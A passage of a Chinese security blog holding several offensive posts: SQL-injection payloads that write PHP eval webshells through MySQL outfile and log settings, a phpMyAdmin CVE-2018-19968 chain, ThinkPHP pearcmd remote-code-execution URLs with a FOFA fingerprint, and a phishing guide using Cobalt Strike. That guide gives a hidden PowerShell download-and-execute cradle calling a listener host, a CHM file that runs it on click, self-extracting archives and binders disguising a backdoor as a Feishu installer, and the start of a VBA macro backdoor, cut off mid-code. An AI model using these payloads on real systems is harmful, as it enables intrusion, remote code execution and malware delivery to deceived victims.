      <a data-url="https://cjb12.github.io/project/2023/04/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" data-id="cln8p3qxf0001d4tgfffn729p" data-title="内网渗透之信息收集" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-MySQL写Shell" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/project/2023/03/06/MySQL%E5%86%99Shell/" class="article-date">
  <time class="dt-published" datetime="2023-03-06T13:05:11.000Z" itemprop="datePublished">2023-03-06</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/project/2023/03/06/MySQL%E5%86%99Shell/">MySQL写Shell</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="通过outfile写入shell（配合union-select"><a href="#通过outfile写入shell（配合union-select" class="headerlink" title="通过outfile写入shell（配合union select"></a>通过outfile写入shell（配合union select</h1><p>利用条件：</p>
<p>1.root权限</p>
<p>2.知道网站绝对路径且具有写入权限</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select &#x27;&lt;?php  @eval($_POST[1]);?&gt;&#x27; into outfile &#x27;E:/phpStudy2018/PHPTutorial/WWW/shell.php&#x27;</span><br><span class="line"></span><br><span class="line">?id=1 union select 1,&quot;&lt;?php @eval($_POST[&#x27;g&#x27;]);?&gt;&quot;,3 into outfile &#x27;E:/study/WWW/evil.php&#x27;</span><br><span class="line">?id=1 union select 1,0x223c3f70687020406576616c28245f504f53545b2767275d293b3f3e22,3 into outfile &quot;E:/study/WWW/evil.php&quot;</span><br></pre></td></tr></table></figure>

<h1 id="将shell写入表中"><a href="#将shell写入表中" class="headerlink" title="将shell写入表中"></a>将shell写入表中</h1><p>利用条件：</p>
<p>1.root权限</p>
<p>2.知道网站绝对路径且具有写入权限</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-- 将shell插入一个表中</span><br><span class="line">insert into `sxss`(`comment`) values (&#x27;&lt;?php  @eval($_POST[1]);?&gt;&#x27;);</span><br><span class="line">-- 查询该数据表，将结果导出文件</span><br><span class="line">select comment from sxss into outfile &#x27;E:/phpStudy2018/PHPTutorial/WWW/shell.php&#x27;;</span><br></pre></td></tr></table></figure>

<h1 id="开启全局日志写入shell"><a href="#开启全局日志写入shell" class="headerlink" title="开启全局日志写入shell"></a>开启全局日志写入shell</h1><p>利用条件：</p>
<p>1.root权限</p>
<p>2.知道网站绝对路径且具有写入权限</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">-- 查看全局日志配置</span><br><span class="line">show variables like &#x27;%general%&#x27;;</span><br><span class="line"></span><br><span class="line">-- 开启全局配置</span><br><span class="line">set global general_log = on;</span><br><span class="line"></span><br><span class="line">-- 将日志文件设置成服务器下的木马文件</span><br><span class="line">set global general_log_file = &#x27;E:/phpStudy2018/PHPTutorial/WWW/shell.php&#x27;;</span><br><span class="line"></span><br><span class="line">-- 然后执行sql语句，mysql会将我没执行的语句记录到日志文件(上一步修改后的文件)中</span><br><span class="line">select &#x27;&lt;?php  @eval($_POST[1]);?&gt;&#x27;;</span><br></pre></td></tr></table></figure>

<h1 id="慢查询日志写入shell"><a href="#慢查询日志写入shell" class="headerlink" title="慢查询日志写入shell"></a>慢查询日志写入shell</h1><p>在实际写webshell的时候，我们经常会遭受到secure_file_priv的阻拦，secure_file_priv这个配置参数用来限制load data、outfile、load_file()的使用，其参数值有以下三种：</p>
<p>1、NULL：表示不允许导入导出</p>
<p>2、目录地址，如&#x2F;tmp&#x2F;：表示只能对指定目录进行导入导出，如&#x2F;tmp&#x2F;</p>
<p>3、空，即没有具体值：表示不对导入导出做限制</p>
<p>可使用如下命令来查看secure_file_priv的值：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show global variables like &#x27;%secure%&#x27;;</span><br></pre></td></tr></table></figure>

<p>高版本的mysql中默认为NULL，也就是不让导入导出</p>
<p>解决办法：</p>
<p>在Windows下可在my.ini的[mysqld]里面，添加secure_file_priv&#x3D;</p>
<p>在linux下可在&#x2F;etc&#x2F;my.cnf的[mysqld]里面，添加secure_file_priv&#x3D;</p>
<p>使用慢查询日志绕过此限制</p>
<p>利用条件：</p>
<p>1.root权限</p>
<p>2.知道网站绝对路径且具有写入权限</p>
<p>执行如下语句写入shell：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">-- 查看慢查询日志开启情况</span><br><span class="line">show variables like &#x27;%slow_query_log%&#x27;;</span><br><span class="line"></span><br><span class="line">-- 开启慢查询日志</span><br><span class="line">set global slow_query_log=1;</span><br><span class="line"></span><br><span class="line">-- 修改日志文件存储的绝对路径</span><br><span class="line">set global slow_query_log_file=&#x27;E:/phpStudy2018/PHPTutorial/WWW/shell.php&#x27;;</span><br><span class="line"></span><br><span class="line">-- 向日志文件中写入</span><br><span class="line">shellselect &#x27;&lt;?php @eval($_POST[1]);?&gt;&#x27; or sleep(11);</span><br></pre></td></tr></table></figure>

<p>使用慢查询日志时，只有当查询时间超过系统时间(默认为10秒)时才会记录在日志中，使用如下语句可查看系统时间：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show global variables like &#x27;%long_query_time%&#x27;;</span><br></pre></td></tr></table></figure>

<h1 id="CVE-2018-19968文件包含"><a href="#CVE-2018-19968文件包含" class="headerlink" title="CVE-2018-19968文件包含"></a>CVE-2018-19968文件包含</h1><p>受影响的phpMyAdmin版本：</p>
<p>4.8.0 ~ 4.8.3</p>
<p>首先登录管理后台</p>
<p>执行如下语句创建数据库，并将shell写入数据表：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CREATE DATABASE foo;</span><br><span class="line">CREATE TABLE foo.bar ( baz VARCHAR(100) PRIMARY KEY );</span><br><span class="line">INSERT INTO foo.bar SELECT &quot;&lt;?php  file_put_contents(&#x27;shell.php&#x27;,&#x27;&lt;?php @eval($_POST[1]);?&gt;&#x27;);?&gt;&quot;;</span><br></pre></td></tr></table></figure>

<p>然后访问<a target="_blank" rel="noopener" href="http://target/chk_rel.php?fixall_pmadb=1&db=foo">http://target/chk_rel.php?fixall_pmadb=1&amp;db=foo</a></p>
<p>来到foo数据库，执行如下语句：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO pma__column_info SELECT &#x27;1&#x27;, &#x27;foo&#x27;, &#x27;bar&#x27;, &#x27;baz&#x27;, &#x27;plop&#x27;, &#x27;plop&#x27;, &#x27;plop&#x27;, &#x27;plop&#x27;, &#x27;../../../../../../../../tmp/sess_***&#x27;,&#x27;plop&#x27;;</span><br></pre></td></tr></table></figure>

<p>将sess_***中的 * * *替换成cookie中phpMyAdmin对应的值</p>
<p>访问：<a target="_blank" rel="noopener" href="http://target/tbl_replace.php?db=foo&table=bar&where_clause=1=1&fields_name%5Bmulti_edit%5D(#)[]=baz&clause_is_unique=1">http://target/tbl_replace.php?db=foo&amp;table=bar&amp;where_clause=1=1&amp;fields_name[multi_edit](#)[]=baz&amp;clause_is_unique=1</a></p>
<p>访问这条连接后将会在网站根目录下生成一个shell.php的webshell，使用蚁剑进行连接</p>
<h1 id="利用分隔符写入"><a href="#利用分隔符写入" class="headerlink" title="利用分隔符写入"></a>利用分隔符写入</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id=1 INTO OUTFILE &#x27;物理路径&#x27; lines terminated by  （一句话hex编码）#</span><br><span class="line">?id=1 INTO OUTFILE &#x27;物理路径&#x27; fields terminated by （一句话hex编码）#</span><br><span class="line">?id=1 INTO OUTFILE &#x27;物理路径&#x27; columns terminated by （一句话hex编码）#</span><br><span class="line">?id=1 INTO OUTFILE &#x27;物理路径&#x27; lines starting by    （一句话hex编码）#</span><br></pre></td></tr></table></figure>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://cjb12.github.io/project/2023/03/06/MySQL%E5%86%99Shell/" data-id="cln8p3qxc0000d4tg8wsugev9" data-title="MySQL写Shell" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-Thinkphp-多语言-RCE" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/project/2023/01/16/Thinkphp-%E5%A4%9A%E8%AF%AD%E8%A8%80-RCE/" class="article-date">
  <time class="dt-published" datetime="2023-01-16T02:20:39.000Z" itemprop="datePublished">2023-01-16</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/project/2023/01/16/Thinkphp-%E5%A4%9A%E8%AF%AD%E8%A8%80-RCE/">Thinkphp 多语言 RCE</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>如果 Thinkphp 程序开启了多语言功能，那就可以通过 get、header、cookie 等位置传入参数，实现目录穿越+文件包含，通过 pearcmd 文件包含这个 trick 即可实现 RCE。</p>
<h2 id="关于pearcmd"><a href="#关于pearcmd" class="headerlink" title="关于pearcmd"></a>关于pearcmd</h2><p>pecl是PHP中用于管理扩展而使用的命令行工具，而pear是pecl依赖的类库。在7.3及以前，pecl&#x2F;pear是默认安装的；在7.4及以后，需要我们在编译PHP的时候指定–with-pear才会安装。在Docker任意版本镜像中，pcel&#x2F;pear都会被默认安装，安装的路径在&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php</p>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>ThinkPHP v6.0.1 &lt;&#x3D; v6.0. x &lt;&#x3D; v6.0.13</p>
<p>ThinkPHP v5.1.x</p>
<p>ThinkPHP v5.0.x</p>
<h2 id="fofa指纹"><a href="#fofa指纹" class="headerlink" title="fofa指纹"></a>fofa指纹</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">header=&quot;think_lang&quot;</span><br></pre></td></tr></table></figure>

<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker pull 7coinsec/thinkphp6013_lang_on</span><br><span class="line"></span><br><span class="line">docker run -it -d -p 3344:80 7coinsec/thinkphp6013_lang_on</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021617371.png" alt="image-20231002161728326"></p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>首先测试是否存在pearcmd，当返回如下图信息就代表pearcmd存在</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/?lang=../../../../../../../../usr/local/lib/php/pearcmd</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021617516.png" alt="image-20231002161752479"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/?lang=../../../../../../../../usr/local/lib/php/pearcmd&amp;+config-create+/&amp;/&lt;?phpinfo();?&gt;+/tmp/hello.php</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021618938.png" alt="image-20231002161808892"></p>
<p>文件包含，直接包含上一步写入的文件或者其他方式上传的文件均可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/index.php?lang=../../../../../../../../tmp/hello</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021619980.png" alt="image-20231002161916940"></p>
<p>写一句话木马</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/?+config-create+/&amp;lang=../../../../../../../../../../usr/local/lib/php/pearcmd&amp;/&lt;?=@eval($_POST[a]);?&gt;+/tmp/1.php</span><br></pre></td></tr></table></figure>

<p>调试参考：</p>
<p><a target="_blank" rel="noopener" href="http://tttang.com/archive/1865/">http://tttang.com/archive/1865/</a></p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/GWZ_X_jFdrq5TQW2otSL5Q">https://mp.weixin.qq.com/s/GWZ_X_jFdrq5TQW2otSL5Q</a></p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/YLbubU9JBPmloO7MWA1HdQ">https://mp.weixin.qq.com/s/YLbubU9JBPmloO7MWA1HdQ</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://cjb12.github.io/project/2023/01/16/Thinkphp-%E5%A4%9A%E8%AF%AD%E8%A8%80-RCE/" data-id="cln8p3qxf0002d4tg296h9b4h" data-title="Thinkphp 多语言 RCE" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-钓鱼及部分免杀" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/project/2023/01/11/%E9%92%93%E9%B1%BC%E5%8F%8A%E9%83%A8%E5%88%86%E5%85%8D%E6%9D%80/" class="article-date">
  <time class="dt-published" datetime="2023-01-11T12:09:00.000Z" itemprop="datePublished">2023-01-11</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/project/2023/01/11/%E9%92%93%E9%B1%BC%E5%8F%8A%E9%83%A8%E5%88%86%E5%85%8D%E6%9D%80/">钓鱼及部分免杀</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>Cobalt Strike 是一款美国 Red Team 开发的渗透测试神器，常被业界人称为 CS。它是一款以 Metasploit 为基础的 GUI 的框架式渗透工具，集成了端口转发、服务扫描、自动化溢出、多模式端口监听、Winexe 木马生成、Win dll 木马生成、Java 木马生成、office 宏病毒生成、木马捆绑等；钓鱼攻击包括：站点克隆、目标信息获取、Java 执行、浏览器自动攻击等。Cobalt Strike 项目的官网地址：<a target="_blank" rel="noopener" href="https://www.cobaltstrike.com./">https://www.cobaltstrike.com。</a></p>
<p>在 Cobalt Strike 中，默认心跳为 60s（即 CS 与受害机默认 60s 才进行一次交互），故执行命令的响应速度很慢，在下载文件时更加明显，所以根据实战环境把时间降低，建议不要太快，否则流量会相对明显</p>
<p><strong>钓鱼往往需要免杀技术的支撑，但本章只讲述钓鱼和些许免杀技术</strong></p>
<p>需要用到kali，先看一下kali的ip</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ifconfig</span><br><span class="line">#ipconfig(dos命令)</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021525054.png" alt="image-20231002152501998"></p>
<p>ip，255.255.255.0子网掩码，192.168.137.255广播地址</p>
<h2 id="开启CS"><a href="#开启CS" class="headerlink" title="开启CS"></a>开启CS</h2><p>先切换成root用户</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo su</span><br></pre></td></tr></table></figure>

<p>提权</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x teamserver</span><br></pre></td></tr></table></figure>

<p>打开teamserver，ip为kali的ip，yb.com是密码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./teamserver 192.168.137.128 yb.com</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021525990.png" alt="image-20231002152520930"></p>
<p>然后在win10打开start.bat，用户名随便输（也可以在kali打开start.sh）</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021525315.png" alt="image-20231002152536268"></p>
<p>主机就是kali的ip，端口默认，密码就是上面设置的密码</p>
<p>设置一个监听器</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021525754.png" alt="image-20231002152551686"></p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021526202.png" alt="image-20231002152608148"></p>
<h2 id="快捷方式"><a href="#快捷方式" class="headerlink" title="快捷方式"></a>快捷方式</h2><p>用 Cobalt Strike 生成命令</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021526929.png" alt="image-20231002152620878"></p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021526635.png" alt="image-20231002152637590"></p>
<p>得到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://192.168.137.131:80/a&#x27;))&quot;</span><br></pre></td></tr></table></figure>

<p>创建一个快捷方式，内容为上</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021526018.png" alt="image-20231002152648969"></p>
<p>将生成的powershell.exe放在靶机上，然后双击打开</p>
<p>成功获取shell</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021527578.png" alt="image-20231002152703516"></p>
<h2 id="CHM帮助文档上线"><a href="#CHM帮助文档上线" class="headerlink" title="CHM帮助文档上线"></a>CHM帮助文档上线</h2><p>新建一个文件夹，名字随意，文件夹里面新建一个 index.html 文件并填入如下代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;&lt;head&gt;&lt;title&gt;Mousejack replay&lt;/title&gt;&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">command exec</span><br><span class="line">&lt;OBJECT id=x classid=&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot;</span><br><span class="line">width=1 height=1&gt;</span><br><span class="line">&lt;PARAM name=&quot;Command&quot; value=&quot;ShortCut&quot;&gt;</span><br><span class="line">&lt;PARAM name=&quot;Button&quot; value=&quot;Bitmap::shortcut&quot;&gt;</span><br><span class="line">&lt;PARAM name=&quot;Item1&quot; value=&#x27;,calc.exe&#x27;&gt;</span><br><span class="line">&lt;PARAM name=&quot;Item2&quot; value=&quot;273,1,1&quot;&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;SCRIPT&gt;</span><br><span class="line">x.Click();</span><br><span class="line">&lt;/SCRIPT&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;&lt;head&gt;&lt;title&gt;Mousejack replay&lt;/title&gt;&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">command exec</span><br><span class="line">&lt;OBJECT id=x classid=&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot;</span><br><span class="line">width=1 height=1&gt;</span><br><span class="line">&lt;PARAM name=&quot;Command&quot; value=&quot;ShortCut&quot;&gt;</span><br><span class="line">&lt;PARAM name=&quot;Button&quot; value=&quot;Bitmap::shortcut&quot;&gt;</span><br><span class="line">&lt;PARAM name=&quot;Item1&quot; value=&quot;,powershell.exe, -nop -w hidden -c IEX</span><br><span class="line">((new-object net.webclient).downloadstring(&#x27;http://192.168.137.131:80/a&#x27;))&quot;&gt;</span><br><span class="line">&lt;PARAM name=&quot;Item2&quot; value=&quot;273,1,1&quot;&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;SCRIPT&gt;</span><br><span class="line">x.Click();</span><br><span class="line">&lt;/SCRIPT&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>EasyCHM 编译生成 CHM</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021527441.png" alt="image-20231002152748388"></p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021528960.png" alt="image-20231002152833900"></p>
<p>放到靶机上打开 CHM 帮助文档然后点击即可在 Cobalt Strike 上线（实战伪装的像一点 <a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_42131443/article/details/112719415">https://blog.csdn.net/weixin_42131443/article/details/112719415</a></p>
<p>点击上线</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021528719.png" alt="image-20231002152847666"></p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021529439.png" alt="image-20231002152905375"></p>
<h2 id="压缩文件自解压上线"><a href="#压缩文件自解压上线" class="headerlink" title="压缩文件自解压上线"></a>压缩文件自解压上线</h2><p>Cobalt Strike 生成 exe 可执行程序后门</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021529159.png" alt="image-20231002152924115"></p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021529262.png" alt="image-20231002152937217"></p>
<p>把生成的 exe 后门和正常的 exe 文件自定义压缩（选中，添加到压缩文件），把两个文件选中后点击添加到压缩文件，然后点击创建自解压格式压缩文件</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021529737.png" alt="image-20231002152949685"></p>
<p>点击 高级-&gt;自解压选项</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021530075.png" alt="image-20231002153000024"></p>
<p>设置解压路径为 C:\Users\yb\Desktop\钓鱼</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021530791.png" alt="image-20231002153013744"></p>
<p>添加解压后运行的程序</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\yb\Desktop\钓鱼\artifact.exe</span><br><span class="line">C:\Users\yb\Desktop\钓鱼\Feishu-win32_ia32-5.28.7-signed.exe</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021530171.png" alt="image-20231002153056120"></p>
<p>设置 模式-&gt; 静默模式-&gt; 全部隐藏</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021531995.png" alt="image-20231002153110953"></p>
<p>设置 更新模式为解压并更新文件 和 覆盖模式为 覆盖所有文件</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021531042.png" alt="image-20231002153122001"></p>
<p>最后设置压缩文件名进行压缩</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021531634.png" alt="image-20231002153134581"></p>
<p>在靶机上执行压缩出来的 exe 文件，此时飞书的安装程序会正常进行，而后门程序也悄悄启动</p>
<p>这个图标看起来有点假，改一下，工具：<code>ResourceHacker</code></p>
<p>图片转换为ico格式：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.bitbug.net/</span><br></pre></td></tr></table></figure>

<h2 id="捆绑文件上线"><a href="#捆绑文件上线" class="headerlink" title="捆绑文件上线"></a>捆绑文件上线</h2><p>用 <code>超级文件捆绑（免杀增强版）.zp.exe</code> 可以把两个 exe 程序绑定在一起，启动一个 exe 程序就会启动另一个 exe 程序</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021532666.png" alt="image-20231002153243623"></p>
<p>把捆绑生成的 exe 文件放到靶机上执行，Cobalt Strike 会获取到目标 shell。</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021532163.png" alt="image-20231002153256116"></p>
<h2 id="Word上线宏语言编写的后门"><a href="#Word上线宏语言编写的后门" class="headerlink" title="Word上线宏语言编写的后门"></a>Word上线宏语言编写的后门</h2><h3 id="word"><a href="#word" class="headerlink" title="word"></a>word</h3><p>Cobalt Strike 生成宏语言编写的后门</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021533592.png" alt="image-20231002153307549"></p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021533752.png" alt="image-20231002153317713"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line">Private Type PROCESS_INFORMATION</span><br><span class="line">    hProcess As Long</span><br><span class="line">    hThread As Long</span><br><span class="line">    dwProcessId As Long</span><br><span class="line">    dwThreadId As Long</span><br><span class="line">End Type</span><br><span class="line"></span><br><span class="line">Private Type STARTUPINFO</span><br><span class="line">    cb As Long</span><br><span class="line">    lpReserved As String</span><br><span class="line">    lpDesktop As String</span><br><span class="line">    lpTitle As String</span><br><span class="line">    dwX As Long</span><br><span class="line">    dwY As Long</span><br><span class="line">    dwXSize As Long</span><br><span class="line">    dwYSize As Long</span><br><span class="line">    dwXCountChars As Long</span><br><span class="line">    dwYCountChars As Long</span><br><span class="line">    dwFillAttribute As Long</span><br><span class="line">    dwFlags As Long</span><br><span class="line">    wShowWindow As Integer</span><br><span class="line">    cbReserved2 As Integer</span><br><span class="line">    lpReserved2 As Long</span><br><span class="line">    hStdInput As Long</span><br><span class="line">    hStdOutput As Long</span><br><span class="line">    hStdError As Long</span><br><span class="line">End Type</span><br><span class="line"></span><br><span class="line">#If VBA7 Then</span><br><span class="line">    Private Declare PtrSafe Function CreateStuff Lib &quot;kernel32&quot; Alias 